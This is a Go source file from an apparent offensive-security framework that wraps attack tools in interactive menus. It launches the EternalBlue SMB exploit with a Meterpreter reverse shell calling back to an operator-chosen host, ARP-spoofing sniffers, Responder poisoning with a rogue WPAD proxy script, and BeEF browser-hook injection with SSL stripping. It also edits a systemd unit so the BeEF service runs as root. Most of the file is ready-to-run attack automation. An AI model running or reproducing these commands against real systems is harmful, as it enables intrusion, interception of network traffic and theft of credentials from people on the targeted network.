package internals

import (
    "os"
    "fmt"
    "utils"
    "menus"
    "bufio"
    "os/exec"
    "bcolors"
    "strings"
    "subprocess"
)

var (
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userName    string
    userPass    string
)

func InternalScan() {
    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; active; ticker on"`); fmt.Println()
}

func NmapPortScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing: " + bcolors.RED + bcolors.ITALIC + "PORT scan " + bcolors.DARKGREEN + "Target " + bcolors.PURPLE + "set to: " + bcolors.ORANGE + bcolors.ITALIC + "%s 🐾" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nmap -v -p- %s`, userTarget); fmt.Println()
}

func NmapVulnScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing vuln scan:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nmap --spoof-mac 0 -sT -sV -Pn -vv -p- --script="vuln and safe" --reason %s`, userTarget); fmt.Println()
}

func SmbVulnScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB scan:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nmap -Pn -v --script "smb-vuln*" -p139,445 %s`, userTarget); fmt.Println()
}

func SmbMapScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`smbmap -q -H %s -u null -p null -r --depth 5`, userTarget); fmt.Println()
}

func RpcEnumScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing RPC Recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`rpcclient -U "" -N %s`, userTarget); fmt.Println()
}

func SmbExploit(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        return
    }
    menus.MenuThreeOne()
    for {
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        fmt.Scan(&userInput)
        switch userInput {
        case "0":
            return
        case "1":
            fmt.Println()
            subprocess.Popen(`ip address`)
            fmt.Println()
            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            reader := bufio.NewReader(os.Stdin)
            userLhost, _ := reader.ReadString('\n')
            userLhost = strings.TrimSpace(userLhost)
            if userLhost == "" {
                userLhost = userLhostIp
            }
            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userLport, _ := reader.ReadString('\n')
            userLport = strings.TrimSpace(userLport)
            if userLport == "" {
                userLport = "9999"
            }
            fmt.Println()
            subprocess.Popen(`msfdb start; msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, userTarget, userLhost, userLport)
            fmt.Println()
        case "cls", "clear":
            utils.ClearScreen()
        case "99", "m", "M", "menu", "Menu", "MENU":
            menus.MenuThreeOne()
        case "00", "h", "H", "help", "Help", "HELP":
            menus.HelpMenuThree()
        default:
            fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 & 1 " + bcolors.BLUE + ")" + bcolors.ENDC)
        }
    }
    fmt.Println()
}

func PacketSniffer(userTarget string) {
    menus.MenuThreeTwo()
    for {
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Sniffer" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐽" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        fmt.Scan(&userInput)
        switch userInput {
        case "0":
            return
        case "1":
            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, userTarget); fmt.Println()
        case "2":
            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`); fmt.Println()
        case "99", "m", "M", "menu", "Menu", "MENU":
            menus.MenuThreeTwo()
        case "00", "h", "H", "help", "Help", "HELP":
            menus.HelpMenuThree()
        default:
            fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
        }
    }
    fmt.Println()
}

func PacketsResponder() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    filePath := "/etc/responder/Responder.conf.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)
        fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Responder " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, userLhost, userLhost)
        filesToReplacements := map[string]map[string]string{
            "/etc/responder/Responder.conf": {
            `WPADScript =`: newString,
            },
        }
        utils.Editors(filesToReplacements)
        }
    subprocess.Popen(`responder -I eth0 -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`); fmt.Println()
}

func BeefBettercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuThreeThree()
    fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userInput)
    switch userInput {
    case "0":
        return
    case "1":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
        }
        fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userLhost, userTarget, userLhost); fmt.Println()
        subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
    case "2":
        if _, err := exec.LookPath("beef-xss"); err != nil {
            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.RED, bcolors.ENDC)
            return
        }
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
        }
        fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        reader := bufio.NewReader(os.Stdin)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userLhost, userLhost); fmt.Println()
        subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss`)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
    fmt.Println()
}
